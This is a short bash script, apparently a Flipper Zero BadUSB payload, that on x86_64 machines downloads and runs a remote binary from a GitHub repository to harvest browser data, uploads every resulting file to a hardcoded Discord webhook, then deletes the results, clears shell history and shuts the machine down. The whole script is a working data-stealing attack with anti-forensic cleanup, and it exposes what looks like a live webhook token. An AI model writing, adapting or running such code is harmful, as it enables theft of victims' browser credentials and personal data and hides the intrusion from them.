#!/bin/bash
export WEBHOOK_URL="https://discord.com/api/webhooks/1180459253924909118/JP-HpTFSYUStv8nitmhmXn_nJzOTdCY84f7YhNOhbXtkSm-5ERSGWk4Bsey8oxvrDJpx"
architecture=$(uname -m)

folder="$PWD"
folder_path="$folder/results/"
files=()

if [ "$architecture" == "armv7l" ]; then
    echo "L'architecture est ARM."
elif [ "$architecture" == "x86_64" ]; then
    echo "Récupération du script"
    curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_amd64 -o magikarp.sh
    chmod +x magikarp.sh
    echo "Exécution du script"
    ./magikarp.sh
    rm "magikarp.sh"
    files=($(find "$folder_path" -type f))
elif [ "$architecture" == "i686" ] || [ "$architecture" == "i386" ]; then
    echo "L'architecture est x86 (32 bits)."
else
    echo "L'architecture n'est pas reconnue : $architecture."
fi

curl_args=()
for ((i=0; i<${#files[@]}; i++)); do
    file="${files[$i]}"
    curl_args+=("-F" "file$((i+1))=@$file")
done

curl "${curl_args[@]}" \
    -F 'payload_json={"username": "Murerig", "content": "Coin Coin 🦆"}' \
    $WEBHOOK_URL

rm -rf $folder_path
history -c
shutdown -h now